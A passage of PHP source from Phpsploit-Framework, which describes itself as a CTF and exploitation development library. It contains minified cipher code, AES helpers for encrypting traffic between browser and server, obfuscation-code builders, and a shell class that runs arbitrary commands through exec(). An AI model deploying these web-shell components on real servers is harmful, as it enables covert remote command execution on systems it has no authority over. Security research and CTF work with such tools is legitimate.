:134217760,2147483657:2080,2147483658:131104,2147483659:134350848,2147483660:0,2147483661:134348832,2147483662:134219776,2147483663:131072,16:133152,17:134350848,18:32,19:2048,20:134219776,21:134217760,22:134348832,23:131072,24:0,25:131104,26:134348800,27:134219808,28:134350880,29:133120,30:2080,31:134217728,2147483664:131072,2147483665:2048,2147483666:134348832,2147483667:133152,2147483668:32,2147483669:134348800,2147483670:134217728,2147483671:134219808,2147483672:134350880,2147483673:134217760,2147483674:134219776,2147483675:0,2147483676:133120,2147483677:2080,2147483678:131104,2147483679:134350848}],u=[4160749569,528482304,33030144,2064384,129024,8064,504,2147483679],n=e.DES=r.extend({_doReset:function(){for(var t=this._key.words,e=[],r=0;r<56;r++){var i=h[r]-1;e[r]=t[i>>>5]>>>31-i%32&1}for(var n=this._subKeys=[],o=0;o<16;o++){for(var s=n[o]=[],c=f[o],r=0;r<24;r++)s[r/6|0]|=e[(l[r]-1+c)%28]<<31-r%6,s[4+(r/6|0)]|=e[28+(l[r+24]-1+c)%28]<<31-r%6;s[0]=s[0]<<1|s[0]>>>31;for(r=1;r<7;r++)s[r]=s[r]>>>4*(r-1)+3;s[7]=s[7]<<5|s[7]>>>27}for(var a=this._invSubKeys=[],r=0;r<16;r++)a[r]=n[15-r]},encryptBlock:function(t,e){this._doCryptBlock(t,e,this._subKeys)},decryptBlock:function(t,e){this._doCryptBlock(t,e,this._invSubKeys)},_doCryptBlock:function(t,e,r){this._lBlock=t[e],this._rBlock=t[e+1],p.call(this,4,252645135),p.call(this,16,65535),_.call(this,2,858993459),_.call(this,8,16711935),p.call(this,1,1431655765);for(var i=0;i<16;i++){for(var n=r[i],o=this._lBlock,s=this._rBlock,c=0,a=0;a<8;a++)c|=d[a][((s^n[a])&u[a])>>>0];this._lBlock=s,this._rBlock=o^c}var h=this._lBlock;this._lBlock=this._rBlock,this._rBlock=h,p.call(this,1,1431655765),_.call(this,8,16711935),_.call(this,2,858993459),p.call(this,16,65535),p.call(this,4,252645135),t[e]=this._lBlock,t[e+1]=this._rBlock},keySize:2,ivSize:2,blockSize:2});function p(t,e){e=(this._lBlock>>>t^this._rBlock)&e;this._rBlock^=e,this._lBlock^=e<<t}function _(t,e){e=(this._rBlock>>>t^this._lBlock)&e;this._lBlock^=e,this._rBlock^=e<<t}t.DES=r._createHelper(n);e=e.TripleDES=r.extend({_doReset:function(){var t=this._key.words;if(2!==t.length&&4!==t.length&&t.length<6)throw new Error("Invalid key length - 3DES requires the key length to be 64, 128, 192 or >192.");var e=t.slice(0,2),r=t.length<4?t.slice(0,2):t.slice(2,4),t=t.length<6?t.slice(0,2):t.slice(4,6);this._des1=n.createEncryptor(i.create(e)),this._des2=n.createEncryptor(i.create(r)),this._des3=n.createEncryptor(i.create(t))},encryptBlock:function(t,e){this._des1.encryptBlock(t,e),this._des2.decryptBlock(t,e),this._des3.encryptBlock(t,e)},decryptBlock:function(t,e){this._des3.decryptBlock(t,e),this._des2.encryptBlock(t,e),this._des1.decryptBlock(t,e)},keySize:6,ivSize:2,blockSize:2});t.TripleDES=r._createHelper(e)}(),function(){var t=U,e=t.lib.StreamCipher,r=t.algo,i=r.RC4=e.extend({_doReset:function(){for(var t=this._key,e=t.words,r=t.sigBytes,i=this._S=[],n=0;n<256;n++)i[n]=n;for(var n=0,o=0;n<256;n++){var s=n%r,s=e[s>>>2]>>>24-s%4*8&255,o=(o+i[n]+s)%256,s=i[n];i[n]=i[o],i[o]=s}this._i=this._j=0},_doProcessBlock:function(t,e){t[e]^=n.call(this)},keySize:8,ivSize:0});function n(){for(var t=this._S,e=this._i,r=this._j,i=0,n=0;n<4;n++){var r=(r+t[e=(e+1)%256])%256,o=t[e];t[e]=t[r],t[r]=o,i|=t[(t[e]+t[r])%256]<<24-8*n}return this._i=e,this._j=r,i}t.RC4=e._createHelper(i);r=r.RC4Drop=i.extend({cfg:i.cfg.extend({drop:192}),_doReset:function(){i._doReset.call(this);for(var t=this.cfg.drop;0<t;t--)n.call(this)}});t.RC4Drop=e._createHelper(r)}(),F=(M=U).lib.StreamCipher,P=M.algo,D=[],E=[],R=[],P=P.Rabbit=F.extend({_doReset:function(){for(var t=this._key.words,e=this.cfg.iv,r=0;r<4;r++)t[r]=16711935&(t[r]<<8|t[r]>>>24)|4278255360&(t[r]<<24|t[r]>>>8);for(var i=this._X=[t[0],t[3]<<16|t[2]>>>16,t[1],t[0]<<16|t[3]>>>16,t[2],t[1]<<16|t[0]>>>16,t[3],t[2]<<16|t[1]>>>16],n=this._C=[t[2]<<16|t[2]>>>16,4294901760&t[0]|65535&t[1],t[3]<<16|t[3]>>>16,4294901760&t[1]|65535&t[2],t[0]<<16|t[0]>>>16,4294901760&t[2]|65535&t[3],t[1]<<16|t[1]>>>16,4294901760&t[3]|65535&t[0]],r=this._b=0;r<4;r++)N.call(this);for(r=0;r<8;r++)n[r]^=i[r+4&7];if(e){var o=e.words,s=o[0],c=o[1],e=16711935&(s<<8|s>>>24)|4278255360&(s<<24|s>>>8),o=16711935&(c<<8|c>>>24)|4278255360&(c<<24|c>>>8),s=e>>>16|4294901760&o,c=o<<16|65535&e;n[0]^=e,n[1]^=s,n[2]^=o,n[3]^=c,n[4]^=e,n[5]^=s,n[6]^=o,n[7]^=c;for(r=0;r<4;r++)N.call(this)}},_doProcessBlock:function(t,e){var r=this._X;N.call(this),D[0]=r[0]^r[5]>>>16^r[3]<<16,D[1]=r[2]^r[7]>>>16^r[5]<<16,D[2]=r[4]^r[1]>>>16^r[7]<<16,D[3]=r[6]^r[3]>>>16^r[1]<<16;for(var i=0;i<4;i++)D[i]=16711935&(D[i]<<8|D[i]>>>24)|4278255360&(D[i]<<24|D[i]>>>8),t[e+i]^=D[i]},blockSize:4,ivSize:2}),M.Rabbit=F._createHelper(P),F=(M=U).lib.StreamCipher,P=M.algo,W=[],O=[],I=[],P=P.RabbitLegacy=F.extend({_doReset:function(){for(var t=this._key.words,e=this.cfg.iv,r=this._X=[t[0],t[3]<<16|t[2]>>>16,t[1],t[0]<<16|t[3]>>>16,t[2],t[1]<<16|t[0]>>>16,t[3],t[2]<<16|t[1]>>>16],i=this._C=[t[2]<<16|t[2]>>>16,4294901760&t[0]|65535&t[1],t[3]<<16|t[3]>>>16,4294901760&t[1]|65535&t[2],t[0]<<16|t[0]>>>16,4294901760&t[2]|65535&t[3],t[1]<<16|t[1]>>>16,4294901760&t[3]|65535&t[0]],n=this._b=0;n<4;n++)q.call(this);for(n=0;n<8;n++)i[n]^=r[n+4&7];if(e){var o=e.words,s=o[0],t=o[1],e=16711935&(s<<8|s>>>24)|4278255360&(s<<24|s>>>8),o=16711935&(t<<8|t>>>24)|4278255360&(t<<24|t>>>8),s=e>>>16|4294901760&o,t=o<<16|65535&e;i[0]^=e,i[1]^=s,i[2]^=o,i[3]^=t,i[4]^=e,i[5]^=s,i[6]^=o,i[7]^=t;for(n=0;n<4;n++)q.call(this)}},_doProcessBlock:function(t,e){var r=this._X;q.call(this),W[0]=r[0]^r[5]>>>16^r[3]<<16,W[1]=r[2]^r[7]>>>16^r[5]<<16,W[2]=r[4]^r[1]>>>16^r[7]<<16,W[3]=r[6]^r[3]>>>16^r[1]<<16;for(var i=0;i<4;i++)W[i]=16711935&(W[i]<<8|W[i]>>>24)|4278255360&(W[i]<<24|W[i]>>>8),t[e+i]^=W[i]},blockSize:4,ivSize:2}),M.RabbitLegacy=F._createHelper(P),U});</script>';
        $_source_code .= '<script type="text/javascript">';
        $_source_code .= 'var aes_key = "' . Class_Base_Format ::htmlentities ( $_rand_key ) . '";';
        $_source_code .= 'var aes_iv="' . Class_Base_Format ::htmlentities ( $_rand_iv ) . '";';
        $_source_code .= 'function phpsploit_encode(data,aes_key,aes_iv){';
        $_source_code .= '    var key = CryptoJS.enc.Utf8.parse(aes_key);';
        $_source_code .= '    var iv =  CryptoJS.enc.Utf8.parse(aes_iv);';
        $_source_code .= '    var encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });';
        $_source_code .= '    var encode_string = encrypted.toString();';
        $_source_code .= '    return encode_string;';
        $_source_code .= '}';
        $_source_code .= 'function phpsploit_decode(data,aes_key,aes_iv){';
        $_source_code .= '    var key = CryptoJS.enc.Utf8.parse(aes_key);';
        $_source_code .= '    var iv =  CryptoJS.enc.Utf8.parse(aes_iv);';
        $_source_code .= '    var bytes = CryptoJS.AES.decrypt(data, key,{ iv: iv, padding: CryptoJS.pad.Pkcs7 });';
        $_source_code .= '    var decode_string = bytes.toString(CryptoJS.enc.Utf8);';
        $_source_code .= '    return decode_string;';
        $_source_code .= '}';
        $_source_code .= 'function call_phpsploit_encode(content){ return phpsploit_encode(content,aes_key,aes_iv); }';
        $_source_code .= 'function call_phpsploit_decode(content){ return phpsploit_decode(content,aes_key,aes_iv); }';
        $_source_code .= '</script>';
        return $_source_code;
    }

    public static function phpsploit_encode_by_base64_iv ( $data , $key , $iv_base64 )
    {
        $_encode = self ::phpsploit_encode ( $data , $key , base64_decode ( $iv_base64 ) );
        return $_encode;
    }

    public static function phpsploit_decode_by_base64_iv ( $data , $key , $iv_base64 )
    {
        $_decode = self ::phpsploit_decode ( $data , $key , base64_decode ( $iv_base64 ) );
        return $_decode;
    }

    public static function phpsploit_encode ( $data , $key , $iv )
    {
        $_encode = base64_encode ( openssl_encrypt ( $data , "AES-256-CBC" , $key , true , $iv ) );
        return $_encode;
    }

    public static function phpsploit_decode ( $data , $key , $iv )
    {
        $_decode = openssl_decrypt ( base64_decode ( $data ) , "AES-256-CBC" , $key , true , $iv );
        return $_decode;
    }

    public static function phpsploit_encode_128 ( $data , $key , $iv )
    {
        $_encode = base64_encode ( openssl_encrypt ( $data , "AES-128-CBC" , $key , true , $iv ) );
        return $_encode;
    }

    public static function phpsploit_decode_128 ( $data , $key , $iv )
    {
        $_decode = openssl_decrypt ( base64_decode ( $data ) , "AES-128-CBC" , $key , true , $iv );
        return $_decode;
    }

    public static function get_phpsploit_encode_types ()
    {
        return self ::$_phpsploit_encode_types;
    }

    public static function is_phpsploit_encode_type ( $type )
    {
        $_exist = in_array ( $type , self ::$_phpsploit_encode_types );
        return $_exist;
    }

    public static function get_js_urldecode ()
    {
        $_string = '<script type="text/javascript">';
        $_string .= 'function utf8_to_utf16(content)';
        $_string .= '{';
        $_string .= '  var result = "";';
        $_string .= '  var content_length = content.length;';
        $_string .= '  var char;';
        $_string .= '  var char_2, char_3;';
        $_string .= '  var index = 0;';
        $_string .= '  while(index < content_length) ';
        $_string .= ' {';
        $_string .= '   char = content.charCodeAt(index++);';
        $_string .= '   switch(char >> 4)';
        $_string .= '   { ';
        $_string .= '      case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7:';
        $_string .= '           result += content.charAt(index-1);';
        $_string .= '           break;';
        $_string .= '      case 12: case 13:';
        $_string .= '           char_2 = content.charCodeAt(index++);';
        $_string .= '           result += String.fromCharCode(((char & 0x1F) << 6) | (char_2 & 0x3F));';
        $_string .= '           break;';
        $_string .= '      case 14:';
        $_string .= '           char_2 = content.charCodeAt(index++);';
        $_string .= '           char_3 = content.charCodeAt(index++);';
        $_string .= '           result += String.fromCharCode(((char & 0x0F) << 12) | ((char_2 & 0x3F) << 6) | ((char_3 & 0x3F) << 0));';
        $_string .= '           break;';
        $_string .= '   }';
        $_string .= ' }';
        $_string .= ' return result;';
        $_string .= '}';
        $_string .= 'function urldecode(encode_string)';
        $_string .= '{';
        $_string .= '  var out_put = encode_string;';
        $_string .= '  var bin_val, this_string;';
        $_string .= '  var my_regexp = /(%[^%]{2})/;';
        $_string .= '  while( ( ( ( match = my_regexp.exec(out_put)) ) != null ) && ( match.length > 1 ) && ( match[1] != "" ) )';
        $_string .= '  {';
        $_string .= '      bin_val = parseInt(match[1].substr(1),16);';
        $_string .= '      this_string = String.fromCharCode(bin_val);';
        $_string .= '      out_put = out_put.replace(match[1], this_string);';
        $_string .= '  }';
        $_string .= '  out_put = out_put.replace(/\\+/g, " ");';
        $_string .= '  out_put = utf8_to_utf16(out_put);';
        $_string .= '  return out_put;';
        $_string .= '}';
        $_string .= 'function is_number(number)';
        $_string .= '{';
        $_string .= '  var reg_pos = /^[0-9]+.?[0-9]+/;';
        $_string .= '  if(reg_pos.test(number))';
        $_string .= '  {';
        $_string .= '     return true;';
        $_string .= '  }';
        $_string .= '  return false;';
        $_string .= '}';
        $_string .= 'function is_integer(integer)';
        $_string .= '{';
        $_string .= '  var reg_pos = /^[0-9]+/;';
        $_string .= '  if(reg_pos.test(integer))';
        $_string .= '  {';
        $_string .= '     return true;';
        $_string .= '  }';
        $_string .= '  return false;';
        $_string .= '}';
        $_string .= '</script>';

        return $_string;
    }

    public static function create_obfuscation_decryption_function_code_string_info ( $confusing_encryption_function_code_string )
    {
        $confusing_encryption_function_code_string = ( chr ( 32 ) . trim ( $confusing_encryption_function_code_string , chr ( 32 ) ) . chr ( 32 ) );
        $_prefix_info                              = array ();
        $_return_value_name_info                   = array ();
        $_function_name_info                       = array ();
        $_function_params_info                     = array ();
        $_suffix_info                              = array ();
        $_items                                    = explode ( chr ( 32 ) , $confusing_encryption_function_code_string );
        $_items_count                              = count ( $_items );
        $_prefix_string                            = $_items[ 0 ];
        $_suffix_string                            = $_items[ $_items_count - 1 ];
        $_items[ 0 ]                               = null;
        $_items[ $_items_count - 1 ]               = null;
        unset( $_items[ 0 ] );
        unset( $_items[ $_items_count - 1 ] );
        $_items_string             = implode ( chr ( 32 ) , $_items );
        $_items                    = explode ( chr ( 61 ) , $_items_string );
        $_items_count              = count ( $_items );
        $_return_value_name_string = $_items[ 0 ];
        $_items[ 0 ]               = null;
        unset( $_items[ 0 ] );
        $_items_string         = implode ( chr ( 61 ) , $_items );
        $_items                = explode ( chr ( 40 ) , $_items_string );
        $_items_count          = count ( $_items );
        $_function_name_string = $_items[ 0 ];
        $_items[ 0 ]           = null;
        unset( $_items[ 0 ] );
        $_items_string           = implode ( chr ( 40 ) , $_items );
        $_items                  = explode ( chr ( 41 ) , $_items_string );
        $_items_count            = count ( $_items );
        $_function_params_string = $_items[ 0 ];
        $_items[ 0 ]             = null;
        unset( $_items[ 0 ] );
        $_obfuscation_decryption_function_code_string_info = ( array ( "prefix_string" => $_prefix_string , "return_value_name_string" => $_return_value_name_string , "function_name_string" => $_function_name_string , "function_params_string" => $_function_params_string , "suffix_string" => $_suffix_string ) );
        return $_obfuscation_decryption_function_code_string_info;
    }

    public static function create_obfuscation_decryption_function_code_info ( $obfuscation_decryption_function_code_string_info )
    {
        $_prefix_info            = array ();
        $_return_value_name_info = array ();
        $_function_name_info     = array ();
        $_function_params_info   = array ();
        $_suffix_info            = array ();

        if ( is_array ( $obfuscation_decryption_function_code_string_info ) ) {
            if ( ( ! empty( $obfuscation_decryption_function_code_string_info[ "prefix_string" ] ) ) && ( is_string ( $obfuscation_decryption_function_code_string_info[ "prefix_string" ] ) ) ) {
                $_string_length = strlen ( $obfuscation_decryption_function_code_string_info[ "prefix_string" ] );
                for ( $index = 0 ; $index < $_string_length ; $index ++ ) {
                    $_prefix_info[] = ord ( substr ( $obfuscation_decryption_function_code_string_info[ "prefix_string" ] , $index , 1 ) );
                }
            }
        }

        if ( is_array ( $obfuscation_decryption_function_code_string_info ) ) {
            if ( ( ! empty( $obfuscation_decryption_function_code_string_info[ "return_value_name_string" ] ) ) && ( is_string ( $obfuscation_decryption_function_code_string_info[ "return_value_name_string" ] ) ) ) {
                $_string_length = strlen ( $obfuscation_decryption_function_code_string_info[ "return_value_name_string" ] );
                for ( $index = 0 ; $index < $_string_length ; $index ++ ) {
                    $_return_value_name_info[] = ord ( substr ( $obfuscation_decryption_function_code_string_info[ "return_value_name_string" ] , $index , 1 ) );
                }
            }
        }

        if ( is_array ( $obfuscation_decryption_function_code_string_info ) ) {
            if ( ( ! empty( $obfuscation_decryption_function_code_string_info[ "function_name_string" ] ) ) && ( is_string ( $obfuscation_decryption_function_code_string_info[ "function_name_string" ] ) ) ) {
                $_string_length = strlen ( $obfuscation_decryption_function_code_string_info[ "function_name_string" ] );
                for ( $index = 0 ; $index < $_string_length ; $index ++ ) {
                    $_function_name_info[] = ord ( substr ( $obfuscation_decryption_function_code_string_info[ "function_name_string" ] , $index , 1 ) );
                }
            }
        }

        if ( is_array ( $obfuscation_decryption_function_code_string_info ) ) {
            if ( ( ! empty( $obfuscation_decryption_function_code_string_info[ "function_params_string" ] ) ) && ( is_string ( $obfuscation_decryption_function_code_string_info[ "function_params_string" ] ) ) ) {
                $_string_length = strlen ( $obfuscation_decryption_function_code_string_info[ "function_params_string" ] );
                for ( $index = 0 ; $index < $_string_length ; $index ++ ) {
                    $_function_params_info[] = ord ( substr ( $obfuscation_decryption_function_code_string_info[ "function_params_string" ] , $index , 1 ) );
                }
            }
        }

        if ( is_array ( $obfuscation_decryption_function_code_string_info ) ) {
            if ( ( ! empty( $obfuscation_decryption_function_code_string_info[ "suffix_string" ] ) ) && ( is_string ( $obfuscation_decryption_function_code_string_info[ "suffix_string" ] ) ) ) {
                $_string_length = strlen ( $obfuscation_decryption_function_code_string_info[ "suffix_string" ] );
                for ( $index = 0 ; $index < $_string_length ; $index ++ ) {
                    $_suffix_info[] = ord ( substr ( $obfuscation_decryption_function_code_string_info[ "suffix_string" ] , $index , 1 ) );
                }
            }
        }

        $_obfuscation_decryption_function_code_info = ( array ( "prefix_info" => $_prefix_info , "return_value_name_info" => $_return_value_name_info , "function_name_info" => $_function_name_info , "function_params_info" => $_function_params_info , "suffix_info" => $_suffix_info ) );
        return $_obfuscation_decryption_function_code_info;
    }


    public static function create_confusing_encryption_function_code_string ( $obfuscation_decryption_function_code_info )
    {
        if ( ( empty( $obfuscation_decryption_function_code_info ) ) || ( ! is_array ( $obfuscation_decryption_function_code_info ) ) ) {
            $obfuscation_decryption_function_code_info = array ( "prefix_info" => array () , "return_value_name_info" => array () , "function_name_info" => array () , "function_params_info" => array () , "suffix_info" => array () );
        }
        $_prefix_string            = "";
        $_return_value_name_string = "";
        $_function_name_string     = "";
        $_function_params_string   = "";
        $_suffix_string            = "";
        if ( ( ! empty( $obfuscation_decryption_function_code_info[ "prefix_info" ] ) ) && ( is_array ( $obfuscation_decryption_function_code_info[ "prefix_info" ] ) ) ) {
            foreach ( $obfuscation_decryption_function_code_info[ "prefix_info" ] as $index => $ascii ) {
                $_prefix_string .= chr ( $ascii );
            }
        }
        if ( ( ! empty( $obfuscation_decryption_function_code_info[ "return_value_name_info" ] ) ) && ( is_array ( $obfuscation_decryption_function_code_info[ "return_value_name_info" ] ) ) ) {
            foreach ( $obfuscation_decryption_function_code_info[ "return_value_name_info" ] as $index => $ascii ) {
                $_return_value_name_string .= chr ( $ascii );
            }
        }
        if ( ( ! empty( $obfuscation_decryption_function_code_info[ "function_name_info" ] ) ) && ( is_array ( $obfuscation_decryption_function_code_info[ "function_name_info" ] ) ) ) {
            foreach ( $obfuscation_decryption_function_code_info[ "function_name_info" ] as $index => $ascii ) {
                $_function_name_string .= chr ( $ascii );
            }
        }
        if ( ( ! empty( $obfuscation_decryption_function_code_info[ "function_params_info" ] ) ) && ( is_array ( $obfuscation_decryption_function_code_info[ "function_params_info" ] ) ) ) {
            foreach ( $obfuscation_decryption_function_code_info[ "function_params_info" ] as $index => $ascii ) {
                $_function_params_string .= chr ( $ascii );
            }
        }
        if ( ( ! empty( $obfuscation_decryption_function_code_info[ "suffix_info" ] ) ) && ( is_array ( $obfuscation_decryption_function_code_info[ "suffix_info" ] ) ) ) {
            foreach ( $obfuscation_decryption_function_code_info[ "suffix_info" ] as $index => $ascii ) {
                $_suffix_string .= chr ( $ascii );
            }
        }
        $_obfuscation_function_code_string = ( $_prefix_string . chr ( 32 ) . $_return_value_name_string . chr ( 61 ) . $_function_name_string . chr ( 40 ) . $_function_params_string . chr ( 41 ) . chr ( 59 ) . chr ( 32 ) . $_suffix_string );
        return $_obfuscation_function_code_string;
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-13
 * Time: 下午12:06
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Shell extends Class_Base implements Interface_Base_Shell
{
    private static $_command = null;
    private static $_output  = null;
    private static $_retval  = null;

    private static function _init ( $command )
    {
        self::$_command = $command;
        self::$_output  = null;
        self::$_retval  = null;
    }

    private static function _clear ()
    {
        self::$_command = null;
        self::$_output  = null;
        self::$_retval  = null;
    }


    public static function command ( $command )
    {
        self::_init ( $command );
        exec ( self::$_command , self::$_output , self::$_retval );
        return self::$_output;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-20
 * Time: 下午11:10
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Index extends Class_Controller
{
    public static function index ( $params = array () )
    {
        $_is_enable_license_agreement = Class_Base_Request::form ( "is_enable_license_agreement" , Class_Base_Request::TYPE_INTEGER , 0 );
        if ( ! empty( $_is_enable_license_agreement ) ) {
            Class_Base_Auth::enable_license_agreement ();
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth::is_login () ) ) {
            Class_Base_Response::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top::top ();
            $_body   = array (
                "menu"    => array (
                    array (
                        "title"    => "/user" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/user" , array () ) ,
                    ) ,
                    array (
                        "title"    => "/server" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/server" , array () ) ,
                    ) ,
                    array (
                        "title"    => "/session" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/session" , array () ) ,
                    ) ,
                    array (
                        "title"    => "/cookie" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/cookie" , array () ) ,
                    ) ,
                    array (
                        "title"    => "/build" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/build" , array ( "is_build" => 0 ) ) ,
                    ) ,
                    array (
                        "title"    => "/debug" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/debug" , array ( "is_debug" => ( empty( $_SESSION[ "PHPSPLOIT_PERMISSION_DEBUG" ] ) ? 0 : 1 ) ) ) ,
                    ) ,
                ) ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom::bottom ();
            Class_Base_Response::output ( Class_View::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response::outputln ( "" );
        }
        return null;
    }

    public static function debug ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth::is_login () ) ) {
            Class_Base_Response::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth::check_permission ();

        $_is_debug = Class_Base_Request::form ( "is_debug" , Class_Base_Request::TYPE_INTEGER , ( empty( $_SESSION[ "PHPSPLOIT_PERMISSION_DEBUG" ] ) ? 0 : 1 ) );
        if ( empty( $_is_debug ) ) {
            $_SESSION[ "PHPSPLOIT_PERMISSION_DEBUG" ] = 0;
        } else {
            $_SESSION[ "PHPSPLOIT_PERMISSION_DEBUG" ] = 1;
        }
        if ( ! is_cli () ) {
            $_form     = array (
                "action"  => "/debug" ,
                "selects" => array (
                    array (
                        "title"   => "( Enabled / Disabled )   : " ,
                        "name"    => "is_debug" ,
                        "options" => array (
                            array ( "describe" => "Enabled Debug" , "title" => "Enabled Debug" , "value" => 1 , "selected" => ( ( ! empty( $_SESSION[ "PHPSPLOIT_PERMISSION_DEBUG" ] ) ) ? "selected" : "" ) ) ,
                            array ( "describe" => "Disabled Debug" , "title" => "Disabled Debug" , "value" => 0 , "selected" => ( ( empty( $_SESSION[ "PHPSPLOIT_PERMISSION_DEBUG" ] ) ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                ) ,
            );
            $_form_top = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Set Up Debugging Environment</div>';
            $_form_top .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">Set up a debugging environment, which will determine the level of detail that the Phpsploit Framework software can provide to you when there are runtime errors or abnormal situations in the production environment!</div>';
            $_top      = Class_View_Top::top ();
            $_body     = array (
                "menu"    => array (
                    array (
                        "title"    => "/user" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/user" , array () ) ,
                    ) ,
                    array (
                        "title"    => "/server" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/server" , array () ) ,
                    ) ,
                    array (
                        "title"    => "/session" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/session" , array () ) ,
                    ) ,
                    array (
                        "title"    => "/cookie" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/cookie" , array () ) ,
                    ) ,
                    array (
                        "title"    => "/build" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/build" , array ( "is_build" => 0 ) ) ,
                    ) ,
                    array (
                        "title"    => "/debug" ,
                        "describe" => "" ,
                        "href"     => Class_Base_Response::get_url ( "/debug" , array ( "is_debug" => $_is_debug ) ) ,
                    ) ,
                ) ,
                "content" => ( $_form_top . Class_View::form_body ( $_form ) ) ,
            );
            $_bottom   = Class_View_Bottom::bottom ();
            Class_Base_Response::output ( Class_View::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response::outputln ( "" );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Server_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "server_info" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/server/server_info" , array () ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_User_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "user_info" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/user/user_info" , array () ) ,
                ) ,
                array (
                    "title"    => "create_production_account" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/user/create_production_privilege_user_password" , array () ) ,
                ) ,
                array (
                    "title"    => "unsubscribe" ,
                    "describe" => "clear" ,
                    "href"     => 'javascript:if(confirm("Are you sure you want to reset the software data of Phpsploit Framework? After resetting, shared memory and session data will be destroyed! If you want to continue using the Phpsploit Framework software, you need to perform the initialization operation of the Phpsploit Framework software again! Note: The files you downloaded, uploaded, and created will not be deleted together. If you want to clean these files, you need to manually perform the cleaning work of these files! Reminder: Files downloaded, uploaded, or created using the Phpsploit Framework software usually contain the word \'phpsploit\' in the file name, which usually appears with a prefix name separated by a period before the file extension! If the downloaded, uploaded, or created file does not have an extension, the word \'phpsploit\' will directly appear as a file extension! This type of naming design is mainly designed to facilitate your management of files downloaded, uploaded, and created using the Phpsploit Framework software. Execute clear (select \'OK\'), discard clear (select 